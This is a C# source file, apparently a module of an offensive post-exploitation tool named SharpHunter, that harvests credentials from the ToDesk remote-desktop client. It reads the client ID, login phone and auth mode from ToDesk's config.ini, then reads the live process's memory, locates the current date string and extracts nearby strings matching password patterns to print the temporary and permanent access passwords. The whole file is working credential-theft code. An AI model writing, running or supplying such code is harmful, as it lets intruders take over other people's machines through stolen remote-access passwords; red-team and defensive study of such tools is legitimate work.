using SharpHunter.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace SharpHunter.Commands
{
    public class ToDeskCredCommand : ICommand
    {
        private const uint PROCESS_VM_READ = 0x0010;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_PRIVATE = 0x20000;
        private const uint PAGE_READWRITE = 0x04;
        private const int MATCH_BUFFER_SIZE = 1024; 
        private static readonly string ProcessName = "ToDesk"; 
        private static readonly string DefaultProcessPath = @"C:\Program Files\ToDesk\ToDesk.exe";
        private static readonly string TempPassPattern = @"\b[a-zA-Z0-9]{8,}\b";
        private static readonly string SafePassPattern = @"\b(?=.*[a-zA-Z])(?=.*\d)(?=.*[^a-zA-Z0-9]).{8,}\b";

        [StructLayout(LayoutKind.Sequential)]
        struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }
        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting credentials from ToDesk process.");
            GetToDeskCred();
        }
        public static void GetToDeskCred()
        {
            Logger.TaskHeader("Hunting ToDesk", 1);
            Process process = Process.GetProcessesByName(ProcessName).FirstOrDefault();
            if (process == null)
            {
                Logger.WriteLine($"[-] {ProcessName} is not run.");
                return;
            }

            Logger.WriteLine($"[*] Hunt process: {ProcessName}.exe PID: {process.Id}");

            string processPath = string.Empty;
            try
            {
                processPath = process.MainModule.FileName;
                Logger.WriteLine($"[*] Process path: {processPath}");
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Unable to get process path: {ex.Message}");
                Logger.WriteLine($"[*] Using default process path: {DefaultProcessPath}");
            }

            string processDirectory = Path.GetDirectoryName(processPath);
            string configPath = Path.Combine(processDirectory, "config.ini");

            if (!File.Exists(configPath))
            {
                Logger.WriteLine($"[-] config.ini file not found, path: {configPath}");
                return;
            }

            Logger.WriteLine($"[*] config.ini file path: {configPath}");

            string clientId = string.Empty;
            string version = string.Empty;
            string loginPhone = string.Empty;
            int authMode = -1;

            try
            {
                var lines = File.ReadAllLines(configPath);
                foreach (var line in lines)
                {
                    var trimmedLine = line.Trim();
                    if (trimmedLine.StartsWith("clientId=", StringComparison.OrdinalIgnoreCase))
                    {
                        clientId = trimmedLine.Substring("clientId=".Length);
                    }
                    else if (trimmedLine.StartsWith("Version=", StringComparison.OrdinalIgnoreCase))
                    {
                        version = trimmedLine.Substring("Version=".Length);
                    }
                    else if (trimmedLine.StartsWith("LoginPhone=", StringComparison.OrdinalIgnoreCase))
                    {
                        loginPhone = trimmedLine.Substring("LoginPhone=".Length);
                    }
                    else if (trimmedLine.StartsWith("AuthMode=", StringComparison.OrdinalIgnoreCase))
                    {
                        if (!int.TryParse(trimmedLine.Substring("AuthMode=".Length), out authMode))
                        {
                            Logger.WriteLine("[-] Unable to parse AuthMode value.");
                        }
                    }
                }

                Logger.WriteLine($"[+] ToDesk Version: {version}\n[+] ClientId: {clientId}\n[+] LoginPhone: {loginPhone}\n[+] AuthMode: {authMode}");
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error reading config.ini: {ex.Message}");
                return;
            }

            if (authMode < 0 || authMode > 2)
            {
                Logger.WriteLine("[-] Invalid AuthMode value, should be 0, 1, or 2.");
                return;
            }

            IntPtr processHandle = NTAPI.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, process.Id);
            if (processHandle == IntPtr.Zero)
            {
                Logger.WriteLine("[-] Failed to open process.");
                return;
            }

            string currentDate = DateTime.Now.ToString("yyyyMMdd");
            byte[] todeskDateBytes = Encoding.ASCII.GetBytes(currentDate);

            bool found = false; 
            long foundPosition = 0; 

            try
            {
                IntPtr address = IntPtr.Zero;
                while (!found)
                {
                    NTAPI.MEMORY_BASIC_INFORMATION mbi;
                    IntPtr result = NTAPI.VirtualQueryEx(processHandle, address, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));

                    if (result == IntPtr.Zero)
                    {
                        break; 
                    }

                    if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE)
                    {
                        long regionSizeLong = mbi.RegionSize.ToInt64();
                        if (regionSizeLong > int.MaxValue)
                        {
                            Logger.WriteLine("[*] Region size too large, skipping.");
                            address = new IntPtr(mbi.BaseAddress.ToInt64() + regionSizeLong);
                            continue;
                        }

                        byte[] buffer = new byte[regionSizeLong];
                        if (NTAPI.ReadProcessMemory(processHandle, mbi.BaseAddress, buffer, (int)regionSizeLong, out int bytesRead))
                        {
                            int sequenceIndex = NTAPI.FindBytes(buffer, todeskDateBytes);
                            if (sequenceIndex != -1)
                            {
                                foundPosition = mbi.BaseAddress.ToInt64() + sequenceIndex;
                                found = true; 

                                long flagStart = foundPosition - MATCH_BUFFER_SIZE;
                                long flagEnd = foundPosition + todeskDateBytes.Length + MATCH_BUFFER_SIZE;

                                if (flagStart < 0)
                                    flagStart = 0;

                                int flagSize = (int)(flagEnd - flagStart);
                                byte[] flagBuffer = new byte[flagSize];
                                if (NTAPI.ReadProcessMemory(processHandle, new IntPtr(flagStart), flagBuffer, flagSize, out bytesRead))
                                {
                                    int baseIndex = NTAPI.FindBytes(flagBuffer, todeskDateBytes);
                                    if (baseIndex == -1)
                                    {
                                        break;
                                    }

                                    List<string> foundStrings = new List<string>();
                                    for (int i = 0; i < flagBuffer.Length; i++)
                                    {
                                        if (flagBuffer[i] >= 32 && flagBuffer[i] <= 126)
                                        {
                                            int start = i;
                                            while (i < flagBuffer.Length && flagBuffer[i] >= 32 && flagBuffer[i] <= 126)
                                            {
                                                i++;
                                            }

                                            byte[] stringBytes = new byte[i - start];
                                            Array.Copy(flagBuffer, start, stringBytes, 0, stringBytes.Length);

                                            string foundString = Encoding.UTF8.GetString(stringBytes);

                                            if (Regex.IsMatch(foundString, TempPassPattern) || Regex.IsMatch(foundString, SafePassPattern))
                                            {
                                                foundStrings.Add(foundString);
                                            }
                                        }
                                    }

                                    if (foundStrings.Count >= 2)
                                    {
                                        switch (authMode)
                                        {
                                            case 0:
                                                Logger.WriteLine($"[*] Security configuration: Use TempPass only\n[+] TempPass: {foundStrings[0]}");
                                                break;
                                            case 1:
                                                Logger.WriteLine($"[*] Security configuration: Use SafePass only\n[+] SafePass: {foundStrings[1]}");
                                                break;
                                            case 2:
                                                Logger.WriteLine($"[*] Security configuration: Both TempPass and SafePass can be used\n[+] TempPass: {foundStrings[0]}\n[+] SafePass: {foundStrings[1]}");
                                                break;
                                            default:
                                                Logger.WriteLine("[-] Invalid AuthMode value, should be 0, 1, or 2.");
                                                break;
                                        }
                                    }
                                    else
                                    {
                                        Logger.WriteLine("[-] Not enough strings found to match passwords.");
                                    }
                                }
                                else
                                {
                                    Logger.WriteLine("[-] Failed to read flag data.");
                                }

                                break; 
                            }
                        }
                        else
                        {
                            Logger.WriteLine("[-] Failed to read memory.");
                        }
                    }

                    address = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                }

                if (!found)
                {
                    Logger.WriteLine("[-] Target byte sequence not found in any checked region.");
                }
            }
            finally
            {
                NTAPI.CloseHandle(processHandle);
            }
        }
    }
}